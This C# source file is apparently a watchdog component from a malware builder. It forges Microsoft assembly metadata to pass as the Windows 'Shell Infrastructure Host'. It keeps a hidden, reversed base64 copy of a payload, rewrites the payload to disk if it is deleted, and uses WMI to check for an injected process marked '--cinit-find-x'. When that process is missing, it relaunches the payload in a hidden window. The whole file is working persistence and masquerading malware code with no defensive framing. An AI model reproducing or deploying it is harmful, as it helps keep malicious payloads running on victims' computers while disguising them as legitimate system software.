using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Linq;
#if DefDebug
using System.Windows.Forms;
#endif

[assembly: AssemblyTitle("Shell Infrastructure Host")]
[assembly: AssemblyDescription("Shell Infrastructure Host")]
[assembly: AssemblyProduct("Microsoft® Windows® Operating System")]
[assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
[assembly: AssemblyFileVersion("10.0.19041.746")]

[assembly: Guid("%Guid%")]

public partial class RProgram
{
    public static string rxM = "";
    public static string rplp = "";
    public static int checkcount = 0;

    public static void Main()
    {
        try
        {
            rplp = PayloadPath;
            rxM = Convert.ToBase64String(File.ReadAllBytes(rplp).Reverse().ToArray());
            RWDLoop();
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W1: " + Environment.NewLine + ex.ToString());
#endif
            Environment.Exit(0);
        }
    }

    public static void RWDLoop()
    {
        try
        {
            if (!File.Exists(rplp))
            {
                checkcount = 0;
                File.WriteAllBytes(rplp, Convert.FromBase64String(rxM).Reverse().ToArray());
                RStart();
            }
            if (!RCheckProc())
            {
                if (checkcount < 2)
                {
                    checkcount += 1;
                }
                else
                {
                    checkcount = 0;
                    RStart();
                }
            }
            Thread.Sleep(startDelay * 1000 + 5000);

            RWDLoop();
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W2: " + Environment.NewLine + ex.ToString());
#endif
        }

    }

    public static void RStart()
    {
        Process.Start(new ProcessStartInfo
        {
            FileName = rplp,
            WindowStyle = ProcessWindowStyle.Hidden,
            WorkingDirectory = Path.GetDirectoryName(rplp),
            CreateNoWindow = true,
        });
    }

    public static bool RCheckProc()
    {
        try
        {
            var options = new ConnectionOptions();
            options.Impersonation = ImpersonationLevel.Impersonate;
            var scope = new ManagementScope(@"\root\cimv2", options);
            scope.Connect();

            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", "#InjectionTarget");
            var query = new ObjectQuery(wmiQuery);
            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
            var managementObjectCollection = managementObjectSearcher.Get();
            foreach (ManagementObject retObject in managementObjectCollection)
            {
                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--cinit-find-x"))
                {
                    return true;
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W3: " + Environment.NewLine + ex.ToString());
#endif
        }
        return false;
    }
}